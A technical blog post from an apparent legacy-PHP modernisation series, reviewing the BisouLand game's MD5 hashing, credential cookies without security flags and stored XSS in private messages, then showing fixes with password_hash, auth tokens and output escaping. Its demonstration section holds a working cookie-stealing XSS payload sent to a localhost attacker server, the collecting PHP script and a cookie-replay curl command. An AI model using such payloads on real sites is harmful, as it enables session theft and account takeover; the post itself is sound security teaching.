<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>eXtreme Legacy 9: XSS Vulnerability &mdash; Lo√Øc Faugeron &mdash; Technical Blog</title>
    <meta name="description" content="Technical articles about Symfony and TDD">
    <meta name="author" content="Lo√Øc Faugeron">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="canonical" href="/2026/01/21/xl-9-xss-vulnerability.html"/>
        <link rel="alternate" href="/feed/atom.xml" type="application/atom+xml" title="Lo√Øc Faugeron"/>
    
    <link rel="stylesheet" href="/css/normalize.css">
    <link rel="stylesheet" href="/css/skeleton.css">
    <link rel="stylesheet" href="/css/dop-dop-dop.css">
    <link rel="stylesheet" href="/css/github-dark.min.css">
    <link rel="stylesheet" href="/css/catppuccin-macchiato.css">
</head>
<body>
    <div class="container">
        <header class="title">
            <h1>
                <a href="/">Lo√Øc Faugeron</a>
                <span class="sub-title">Technical Blog</span>
            </h1>
            
            <nav class="row">
                <a class="button two columns" href="/about">About</a>
                <a class="button two columns" href="/">Articles</a>
                <a class="button three columns" href="/best-articles">Best Articles</a>
                <a class="button two columns" href="/feed/atom.xml">RSS</a>
                <a class="button two columns" href="https://github.com/gnugat/gnugat.github.io/tree/main/_sculpin">Sources</a>
            </nav>
        </header>

        <article>
            <header>
                <h2>
    eXtreme Legacy 9: XSS Vulnerability
    <span class="sub-title">21/01/2026</span>
</h2>
                            <nav>
                                                            <a class="button " href="/tags/security">security</a>
                                                            <a class="button " href="/tags/extreme-legacy">extreme-legacy</a>
                    </nav>
                </header>

                <blockquote>
  <p>ü§ò Awakened by the sins of forgotten sanitization,
  the Cookie Burglar breaches the walls of client-side trust,
  stealing credentials from the altar of the Script Injector with its serpentine payloads! üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
<li><a href="/2025/09/17/xl-2-smoke-tests.html">üí® written Smoke Tests</a></li>
<li><a href="/2025/09/24/xl-3-end-to-end-tests.html">üéØ written End to End Tests</a></li>
<li><a href="/2025/10/01/xl-4-coding-standards.html">üßπ created and applied Coding Standards</a></li>
<li><a href="/2025/10/22/xl-5-pdo.html">‚õÉ migrated to PDO</a></li>
<li><a href="/2025/11/19/xl-6-php-8.html">üêò upgraded PHP 5 to PHP 8</a></li>
<li><a href="/2025/11/26/xl-7-rector.html">üè° applied automated refactorings using Rector</a></li>
<li><a href="/2025/12/03/xl-8-postgresql.html">üêò migrated from MySQL to PostgreSQL</a></li>
</ol>

<p>This means we can run it locally (http://localhost:43000/),
and have some level of automated tests.</p>

<p>When migrating from the deprecated PHP extension <code>mysql</code> to <code>PDO</code>,
we were expecting to find some SQL injection vulnerabilities,
as the queries were written by concatenating user input.</p>

<p>But to our surprise, none of these were exploitable,
as the user input was sanitised and validated
(e.g. only 15 alphanumerical characters for the username, <code>addslashes</code>, <code>htmlentities</code>, ...).</p>

<p>Still, <a href="https://paragonie.com/blog/2017/12/2018-guide-building-secure-php-software#secure-php-databases">following the Secure PHP Database recommendations</a>, we:</p>

<ul>
<li>migrated away from user input concatenated in the SQL query to prepared statements</li>
<li>made sure to disable emulated prepared statement</li>
</ul>

<p>In today's article, we'll explore an actually exploitable vulnerability
which allows an attacker to steal a victim's credentials and impersonate them.</p>

<ul>
<li><a href="#the-vulnerabilities">The vulnerabilities</a>

<ul>
<li><a href="#weak-password-hashing">Weak password hashing</a></li>
<li><a href="#credentials-in-cookies">Credentials in cookies</a></li>
<li><a href="#unsafe-cookies">Unsafe cookies</a></li>
<li><a href="#xss-in-private-messages">XSS in private messages</a></li>
</ul></li>
<li><a href="#attack-demonstration">Attack demonstration</a></li>
<li><a href="#remediation">Remediation</a>

<ul>
<li><a href="#password-hashing-functions">Password hashing functions</a></li>
<li><a href="#auth-token-in-cookies">Auth Token in cookies</a></li>
<li><a href="#escaping-user-input">Escaping user input</a></li>
</ul></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="the-vulnerabilities">The Vulnerabilities</h2>

<p>First we're going to look at different sections of the code.</p>

<h3 id="authentication">Authentication</h3>

<p>Let's start with how logging in is handled:</p>

<pre><code class="php">// phpincludes/app.php
// ---------- Visitor Logs in

if ('POST' === $_SERVER['REQUEST_METHOD'] &amp;&amp; isset($_POST['connexion'])) {
    // Ensuite on v√©rifie que les variables existent et contiennent quelque chose :)
    if (isset($_POST['pseudo'], $_POST['mdp']) &amp;&amp; !empty($_POST['pseudo']) &amp;&amp; !empty($_POST['mdp'])) {
        // Mesure de s√©curit√©, notamment pour √©viter les injections sql.
        // Le htmlentities √©vitera de le passer par la suite.
        $pseudo = htmlentities((string) $_POST['pseudo']);
        $mdp = htmlentities((string) $_POST['mdp']);
        // Hashage du mot de passe.
        $mdp = md5($mdp);

        // ---------- Persist the authentication (cookie creation)
        // La requ√™te qui compte le nombre de pseudos
        $stmt = $pdo-&gt;prepare('SELECT COUNT(*) AS nb_pseudo FROM membres WHERE pseudo = :pseudo');
        $stmt-&gt;execute(['pseudo' =&gt; $pseudo]);

        // La on v√©rifie si le nombre est diff√©rent que z√©ro
        if (0 != $stmt-&gt;fetchColumn()) {
            // S√©lection des informations.
            $stmt = $pdo-&gt;prepare('SELECT id, confirmation, mdp, nuage FROM membres WHERE pseudo = :pseudo');
            $stmt-&gt;execute(['pseudo' =&gt; $pseudo]);
            $donnees_info = $stmt-&gt;fetch();

            if (isset($_POST['auto'])) {
                $timestamp_expire = time() + 30 * 24 * 3600;
                setcookie('pseudo', $pseudo, ['expires' =&gt; $timestamp_expire]);
                setcookie('mdp', $mdp, ['expires' =&gt; $timestamp_expire]);
            }
        }
    }
}
</code></pre>

<p>And here's how the cookie based authentication is done:</p>

<pre><code class="php">// phpincludes/app.php
// ---------- Authenticate player (using cookie)

// Si on est pas connect√©.
if (false == $_SESSION['logged']) {
    $id = 0;
    // On r√©cup√®re les cookies enregistr√©s chez l'utilisateurs, s'ils sont la.
    if (isset($_COOKIE['pseudo']) &amp;&amp; isset($_COOKIE['mdp'])) {
        $pseudo = htmlentities(addslashes((string) $_COOKIE['pseudo']));
        $mdp = htmlentities(addslashes($_COOKIE['mdp']));
        // La requ√™te qui compte le nombre de pseudos
        $stmt = $pdo-&gt;prepare('SELECT COUNT(*) AS nb_pseudo FROM membres WHERE pseudo = :pseudo');
        $stmt-&gt;execute(['pseudo' =&gt; $pseudo]);

        if (0 != $stmt-&gt;fetchColumn()) {
            // S√©lection des informations.
            $stmt = $pdo-&gt;prepare('SELECT id, confirmation, mdp, nuage FROM membres WHERE pseudo = :pseudo');
            $stmt-&gt;execute(['pseudo' =&gt; $pseudo]);
            $donnees_info = $stmt-&gt;fetch();

            // Si le mot de passe est le m√™me (le mot de passe est d√©j√† crypt√©).
            // Si le compte est confirm√©.
            if ($donnees_info['mdp'] == $mdp &amp;&amp; true === $donnees_info['confirmation']) {
                // On modifie la variable qui nous indique que le membre est connect√©.
                $_SESSION['logged'] = true;
                // On cr√©√© les variables contenant des informations sur le membre.
                $_SESSION['id'] = $donnees_info['id'];
                $_SESSION['pseudo'] = $pseudo;
                $_SESSION['nuage'] = $donnees_info['nuage'];
                $page = 'cerveau';
            }
        }
    }
}
</code></pre>

<p>We can already spot some issues here.</p>

<h4 id="weak-password-hashing">Weak password hashing</h4>

<p>First on the list is the following:</p>

<pre><code class="php">$mdp = md5($mdp);
</code></pre>

<p>MD5 is a weak password hashing strategy for several reasons:</p>

<ul>
<li><strong>Speed</strong>: MD5 was designed to be fast (billions of hashes per second on modern hardware),
making brute-force attacks trivial

<ul>
<li><strong>Single iteration</strong>: Proper algorithms use thousands of iterations to slow attackers, MD5 uses one</li>
<li><strong>Collision vulnerability</strong>: MD5 is cryptographically broken,
as attackers can generate different inputs that produce the same hash</li>
</ul></li>
<li><strong>Rainbow tables</strong>: Precomputed hash databases allow instant lookups</li>
<li><strong>No salt</strong>: Two users with the same password get identical hashes, enabling mass cracking</li>
</ul>

<p>This means stolen MD5 hashes can be reversed to plain text passwords,
allowing attackers to access accounts and potentially other sites where victims reused passwords.</p>

<h4 id="credentials-in-cookies">Credentials in cookies</h4>

<p>Second on the list are the actual credentials (username and password) being stored in the cookies:</p>

<pre><code class="php">setcookie('pseudo', $pseudo, ['expires' =&gt; $timestamp_expire]);
setcookie('mdp', $mdp, ['expires' =&gt; $timestamp_expire]);
</code></pre>

<p>This is fundamentally flawed:</p>

<ul>
<li><strong>Sent with every request</strong>: Credentials are transmitted with every HTTP request,
increasing exposure unnecessarily</li>
<li><strong>Cannot be revoked</strong>: There's no server-side session to invalidate,
the only way to revoke access is to change the password</li>
<li><strong>Client-side storage risks</strong>: Credentials persist in browser storage,
accessible to browser extensions and local malware</li>
<li><strong>Stolen cookies = stolen passwords</strong>: An attacker with the cookie hash
has the actual password hash, which can be cracked offline</li>
</ul>

<h4 id="unsafe-cookies">Unsafe cookies</h4>

<p>Third on the list is how we set the cookies:</p>

<pre><code class="php">setcookie('pseudo', $pseudo, ['expires' =&gt; $timestamp_expire]);
setcookie('mdp', $mdp, ['expires' =&gt; $timestamp_expire]);
</code></pre>

<p>Here we're leaving the default settings for the following options:</p>

<ul>
<li><code>httponly</code>: defaults to <code>false</code>,
which means the cookie can be used by JavaScript scripts</li>
<li><code>secure</code>: defaults to <code>false</code>,
which means the cookie can be sent over HTTP (as opposed to only be sent through HTTPS)</li>
<li><code>samesite</code>: not set,
which means the cookie can be sent to other sites</li>
</ul>

<h3 id="private-messages">Private Messages</h3>

<p>Let's resume our review of the code as there's more,
especially with the handling of private messages which are stored in the database
as follow:</p>

<pre><code class="php">// phpincludes/fctIndex.php
function AdminMP($cible, $objet, $message, bool $lu = false): void
{
    $pdo = bd_connect();
    $castToPgBoolean = cast_to_pg_boolean();
    $castToPgTimestamptz = cast_to_pg_timestamptz();
    $message = nl2br((string) $message);

    $stmt = $pdo-&gt;prepare('SELECT COUNT(*) AS nbmsg FROM messages WHERE destin = :destin');
    $stmt-&gt;execute(['destin' =&gt; $cible]);

    $nbmsg = $stmt-&gt;fetchColumn();
    if ($nbmsg &gt;= 20) {
        $Asuppr = $nbmsg - 19;
        $stmt = $pdo-&gt;prepare(
            'DELETE FROM messages'
            .' WHERE ('
            .'     destin = :destin'
            ."     AND timestamp &lt;= CURRENT_TIMESTAMP - INTERVAL '48 hours'"
            .' )'
            .' ORDER BY id LIMIT :limit',
        );
        $stmt-&gt;execute(['destin' =&gt; $cible, 'limit' =&gt; $Asuppr]);
    }

    $timestamp = time();
    $stmt = $pdo-&gt;prepare(
        'INSERT INTO messages'
        .' (id, posteur, destin, message, timestamp, statut, titre)'
        .' VALUES(:id, :posteur, :destin, :message, :timestamp, :statut, :titre)',
    );
    $stmt-&gt;execute([
        'id' =&gt; Uuid::v7(),
        'posteur' =&gt; '00000000-0000-0000-0000-000000000001',
        'destin' =&gt; $cible,
        'message' =&gt; $message,
        'timestamp' =&gt; $castToPgTimestamptz-&gt;fromUnixTimestamp($timestamp),
        'statut' =&gt; $castToPgBoolean-&gt;from($lu),
        'titre' =&gt; $objet],
    );
}
</code></pre>

<p>And finally when they are displayed, the values from the database are printed directly:</p>

<pre><code class="php">// phpincludes/lire.php
if (true === $_SESSION['logged']) {
    $pdo = bd_connect();
    $castToUnixTimestamp = cast_to_unix_timestamp();

    if (isset($_GET['idmsg']) &amp;&amp; !empty($_GET['idmsg'])) {
        $idmsg = htmlentities((string) $_GET['idmsg']);
        $stmt = $pdo-&gt;prepare('SELECT posteur, destin, message, timestamp, statut, titre FROM messages WHERE id = :id');
        $stmt-&gt;execute(['id' =&gt; $idmsg]);
        $donnees = $stmt-&gt;fetch();
        if ($donnees['destin'] == $_SESSION['id']) {
            if (false === $donnees['statut']) {
                $stmt2 = $pdo-&gt;prepare('UPDATE messages SET statut = TRUE WHERE id = :id');
                $stmt2-&gt;execute(['id' =&gt; $idmsg]);
            }
            $stmt = $pdo-&gt;prepare('SELECT pseudo FROM membres WHERE id = :id');
            $stmt-&gt;execute(['id' =&gt; $donnees['posteur']]);
            $donnees2 = $stmt-&gt;fetch();
            $from = $donnees2['pseudo'];

            $objet = $donnees['titre'];
            $message = $donnees['message'];
            $dateEnvoie = $castToUnixTimestamp-&gt;fromPgTimestamptz($donnees['timestamp']);
            ?&gt;

&lt;a href="boite.html" title="Messages"&gt;Retour √† la liste des messages&lt;/a&gt;
&lt;br /&gt;
&lt;p&gt;Auteur : &lt;?php echo stripslashes((string) $from); ?&gt;&lt;/p&gt;
&lt;p&gt;Envoy√© le &lt;?php echo date('d/m/Y √† H\hi', $dateEnvoie); ?&gt;&lt;/p&gt;
&lt;p&gt;Objet : &lt;?php echo stripslashes((string) $objet); ?&gt;&lt;/p&gt;
Message :&lt;br /&gt;
&lt;div class="message"&gt;&lt;?php echo bbLow($message); ?&gt;&lt;/div&gt;
</code></pre>

<p>There's one last problematic issue with the code above.</p>

<h4 id="xss-in-private-messages">XSS in private messages</h4>

<p>Last, but certainly not least. We can see in <code>AdminMP()</code> that private messages are stored
in the database without any validation or sanitization.</p>

<p>This allows players to write malicious code (HTML, JavaScript) in their message,
which will then be permanently stored.</p>

<p>When they are displayed, these messages are again printed as is straight from the database,
without sanitization, which means that any malicious code (HTML, JavaScript) will be displayed and executed.</p>

<p>This opens the door to Cross Site Scripting (XSS) attacks.</p>

<hr />

<h2 id="attack-demonstration">Attack demonstration</h2>

<p>Security Vulnerabilities have been found, but can they actually be used?</p>

<p>Given the lack of <code>httponly</code>, <code>secure</code> and <code>samesite</code> options,
it should be possible to obtain the credentials
(and that's without physical access to the computer!).</p>

<p>Let's demonstrate how the attack can be executed in 4 steps:</p>

<ol>
<li>Attacker logs in, and sends a private message to their victim</li>
<li>The victim logs in, checks their inbox, clicks to view the attacker's message</li>
<li>On being displayed, the message executes the JavaScript which sends the victim's cookie to the attacker's server</li>
<li>The attacker receives the cookie on their server, and can create forged cookies to authenticate as the victim</li>
</ol>

<p>Here's an example of message an attacker can craft:</p>

<pre><code>ALL YOUR BASE ARE BELONG TO US
&lt;img src=x onerror="new Image().src='http://localhost:8080/steal?c='+document.cookie"&gt;
HAHAHA
</code></pre>

<p>The <code>onerror</code> attribute will execute the JavaScript when the image fails to load,
and the <code>new Image().src</code> makes an HTTP request with the victim's cookies.</p>

<p><img alt="BisouLand screenshot" src="/images/xl-9-mischief-achived.png" width="100%" /></p>

<p>This will happen without the knowledge of the victim!</p>

<p>Here's a demo server we can use to test this:</p>

<pre><code class="php">&lt;?php
/**
 * File (for demonstration purpose only): xl-9-attacker-server.php
 *
 * Receives stolen cookies from payloads injected into the BisouLand messaging system.
 * Demonstrates how credentials are exfiltrated via JavaScript in real attack scenarios.
 *
 * Usage: php -S localhost:8080 xl-9-attacker-server.php
 */

function server_log(string $message): void {
    $receivedAt = new \DateTimeImmutable()-&gt;format('D M j H:i:s Y');

    file_put_contents('php://stderr', "[{$receivedAt}] {$message}\n");
}

// Parse cookies
$cookies = [];
parse_str(str_replace('; ', '&amp;', $_GET['c'] ?? ''), $cookies);

// Display to console
$username = $cookies['pseudo'] ?? '';
$password = $cookies['mdp'] ?? '';
server_log("c is for cookies, that's good enough for me");
server_log("  Username: {$username}");
server_log("  Password: {$password}");

// Send response
http_response_code(204);
</code></pre>

<p>The attacker will receive on their server:</p>

<pre><code>[Tue Dec 2 18:11:34 2025] c is for cookies, that's good enough for me
[Tue Dec 2 18:11:34 2025]   Username: ln42
[Tue Dec 2 18:11:34 2025]   Password: 25d55ad283aa400af464c76d713c07ad
</code></pre>

<p>And can use them to access the victim's account:</p>

<pre><code class="bash">curl --cookie 'pseudo=ln42; mdp=25d55ad283aa400af464c76d713c07ad' http://localhost:43000/cerveau.html
</code></pre>

<hr />

<h2 id="remediation">Remediation</h2>

<p>Now that we've identified the vulnerabilities, let's fix them systematically.</p>

<h3 id="password-hashing-functions">Password hashing functions</h3>

<p>Let's follow <a href="https://paragonie.com/blog/2017/12/2018-guide-building-secure-php-software#secure-php-passwords">the secure PHP Password Hashing recommendations</a>,
which suggest using the <code>password_*()</code> functions available since PHP 5.5.</p>

<p>First in <code>phpincludes/inscription.php</code>,
we'll hash the password with a proper algorithm
(as of PHP 5.5, it's Bcrypt, but might be changed for Argon2 in the future):</p>

<pre><code class="diff">- // Hashage du mot de passe avec md5().
- $hmdp = md5($mdp);
+ // Hashage du mot de passe avec Bcrypt ou Argon2.
+ $hmdp = password_hash($mdp, \PASSWORD_DEFAULT);

  $id = Uuid::v7();
  $stmt = $pdo-&gt;prepare(
      'INSERT INTO membres (id, pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
      .' VALUES (:id, :pseudo, :mdp, :confirmation, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, :amour)',
  );
  $stmt-&gt;execute([
      'id' =&gt; $id,
      'pseudo' =&gt; $pseudo,
      'mdp' =&gt; $hmdp,
      'confirmation' =&gt; $castToPgBoolean-&gt;from(true),
      'amour' =&gt; 300,
  ]);
</code></pre>

<p>Then in <code>phpincludes/app.php</code> when the visitor attempts to login,
we use <code>password_verify()</code> to compare the hash stored in the database,
and the plain text password provided:</p>

<pre><code class="diff">  $mdp = htmlentities((string) $_POST['mdp']);
  // Hashage du mot de passe.
- $mdp = md5($mdp);

  // Si le mot de passe est le m√™me.
- if ($donnees_info['mdp'] == $mdp) {
+ if (password_verify($mdp, $donnees_info['mdp'])) {
</code></pre>

<h3 id="auth-token-in-cookies">Auth Token in cookies</h3>

<p>Next, we're going to follow 
<a href="https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence#title.2.1">the secure authentication in PHP with long term persistence</a>,
which recommend the creation of authentication tokens.</p>

<p>We're going to change the <code>Persist the authentication (cookie creation)</code> section,
replacing it with the creation of an Auth Token which we'll save in the database,
and then store in the cookie:</p>

<pre><code class="php">        // ---------- Persist the authentication (cookie creation)
        // Instead of counting matches, then selecting pseudonym
        // we directly select the account ID
        $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
            SELECT id AS account_id
            FROM membres
            WHERE pseudo = :pseudonym
        SQL);
        $stmt-&gt;execute(['pseudonym' =&gt; $pseudo]);
        /**
         * @var array&lt;{
         *     account_id: string, // UUID
         * }&gt;|false $account
         */
        $account = $stmt-&gt;fetch();
        if (false !== $account) {
            // Using Symfony\Component\Uid\Uuid
            // This is the "selector"
            $authTokenId = Uuid::v7();

            // 32 random hexadecimal characters
            // This is stored directly in the cookie
            $plainToken = bin2hex(random_bytes(16));

            // The hash is stored in the database
            // If the table's content is leaked, it won't give what the cookies hold
            $tokenHash = hash('sha256', $plainToken);

            $expiresAt = new \DateTimeImmutable('+30 days');

            $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
                INSERT INTO auth_tokens
                (auth_token_id, token_hash, account_id, expires_at)
                VALUES (:auth_token_id, :token_hash, :account_id, :expires_at)
            SQL);
            $stmt-&gt;execute([
                'auth_token_id' =&gt; $authTokenId,
                'token_hash' =&gt; $tokenHash,
                'account_id' =&gt; $account['account_id'],
                'expires_at' =&gt; $expiresAt-&gt;format('Y-m-d\\TH:i:s.uP'),
            ]);

            setcookie(
                'bl_auth_token',
                "{$authTokenId}:{$plainToken}",
                [
                    'expires' =&gt; $expiresAt-&gt;getTimestamp(),
                    // Using safer cookie settings
                    'httponly' =&gt; true,
                    'secure' =&gt; true,
                    'samesite' =&gt; 'Strict',
                    'path' =&gt; '/',
                ],
            );
        }
</code></pre>

<p>As suggested in the Paragonie article,
we now store in the cookie <code>&lt;authTokenId&gt;:&lt;token&gt;</code>,
this way it no longer contains the username and password,
so obtaining it doesn't compromise the account entirely.</p>

<p>Here's a table to store these:</p>

<pre><code class="sql">--------------------------------------------------------------------------------
-- Authentication Tokens
-- Allows secure Authentication Persistence
--------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS auth_tokens (
    auth_token_id UUID PRIMARY KEY,
    token_hash VARCHAR(64) NOT NULL,
    account_id UUID NOT NULL REFERENCES membres(id) ON DELETE CASCADE,
    created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP + '30 days'
);
</code></pre>

<p>We also need to replace the entire <code>Authenticate player (using cookie)</code> section,
to check if the cookie is valid we'll need to hash it,
and then compare it to the hash in the database using the "constant-time" <code>hash_equals</code></p>

<pre><code class="php">if (false === $_SESSION['logged'] &amp;&amp; isset($_COOKIE['bl_auth_token'])) {
    [$authTokenId, $plainToken] = explode(':', $_COOKIE['bl_auth_token'], 2);

    $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
        SELECT token_hash, account_id
        FROM auth_tokens
        WHERE auth_token_id = :auth_token_id
          AND expires_at &gt; CURRENT_TIMESTAMP
    SQL);
    $stmt-&gt;execute([
        'auth_token_id' =&gt; $authTokenId,
    ]);
    /** @var array{token_hash: string, account_id: string}|false $authToken */
    $authToken = $stmt-&gt;fetch();

    if (false !== $authToken) {
        $tokenHash = hash('sha256', $plainToken);
        if (hash_equals($authToken['token_hash'], $tokenHash)) {
            // Token is valid, get account details
            $stmt = $pdo-&gt;prepare(&lt;&lt;&lt;'SQL'
                SELECT id, pseudo, nuage
                FROM membres
                WHERE id = :account_id
            SQL);
            $stmt-&gt;execute([
                'account_id' =&gt; $authToken['account_id'],
            ]);
            /** @var array{id: string, pseudo: string, nuage: int}|false $account */
            $account = $stmt-&gt;fetch();

            if (false !== $account) {
                // On modifie la variable qui nous indique que le membre est connect√©.
                $_SESSION['logged'] = true;
                // On cr√©√© les variables contenant des informations sur le membre.
                $_SESSION['id'] = $account['id'];
                $_SESSION['pseudo'] = $account['pseudo'];
                $_SESSION['nuage'] = $account['nuage'];
                $page = 'cerveau';
            }
        }
    }
}
</code></pre>

<h3 id="escaping-user-input">Escaping user input</h3>

<p>Finally, we can fix the XSS vulnerability by escaping the user-generated content,
such as the title and message content, before displaying it:</p>

<pre><code class="diff">  &lt;!-- phpincludes/lire.php --&gt;
  &lt;a href="boite.html" title="Messages"&gt;Retour √† la liste des messages&lt;/a&gt;
  &lt;br /&gt;
  &lt;p&gt;Auteur : &lt;?php echo stripslashes((string) $from); ?&gt;&lt;/p&gt;
  &lt;p&gt;Envoy√© le &lt;?php echo date('d/m/Y √† H\hi', $dateEnvoie); ?&gt;&lt;/p&gt;
- &lt;p&gt;Objet : &lt;?php echo stripslashes((string) $objet); ?&gt;&lt;/p&gt;
+ &lt;p&gt;Objet : &lt;?php echo htmlspecialchars(stripslashes((string) $objet), ENT_QUOTES, 'UTF-8'); ?&gt;&lt;/p&gt;
  Message :&lt;br /&gt;
- &lt;div class="message"&gt;&lt;?php echo bbLow($message); ?&gt;&lt;/div&gt;
+ &lt;div class="message"&gt;&lt;?php echo bbLow(htmlspecialchars($message, ENT_QUOTES, 'UTF-8')); ?&gt;&lt;/div&gt;
</code></pre>

<h2 id="conclusion">Conclusion</h2>

<p>In this article, we've explored a critical vulnerability chain in BisouLand
that allowed attackers to steal user credentials through XSS attacks.</p>

<p>The combination of insecure cookie handling (storing plain username and password,
missing security flags) and unescaped user-generated content
created a perfect storm for account takeover attacks.</p>

<p>The remediation steps we've implemented ensure that:</p>

<ul>
<li>Credentials are never exposed to client-side code</li>
<li>Session cookies are protected with proper security flags</li>
<li>User-generated content is properly escaped before display</li>
<li>XSS attacks can no longer steal authentication data</li>
</ul>

<p>With these fixes in place, BisouLand is significantly more secure against
the most common web application attacks.</p>

<blockquote>
  <p>‚ÅâÔ∏è What do you mean, there's no dependency injection""?</p>
</blockquote>


            <footer>
                            <nav class="row">
                            <a class="button six columns" href="/2025/12/03/xl-8-postgresql.html" title="eXtreme Legacy 8: From MySQL to PostgreSQL">Previous &lt; eXtreme Legacy 8: From MySQL to PostgreSQL</a>
                                </nav>
                    <hr />
            </footer>
        </article>

        <footer>
            <nav class="row">
                <a class="button two columns" href="/about">About</a>
                <a class="button two columns" href="/">Articles</a>
                <a class="button three columns" href="/best-articles">Best Articles</a>
                <a class="button two columns" href="/feed/atom.xml">RSS</a>
                <a class="button two columns" href="https://github.com/gnugat/gnugat.github.io/tree/main/_sculpin">Sources</a>
            </nav>
        </footer>
    </div>

    <script src="/js/highlight.min.js"></script>
    <script type="text/javascript">hljs.highlightAll();</script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Q9V6KYH7PW"></script>
    <script type="text/javascript">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-Q9V6KYH7PW');
    </script>
</body>
</html>
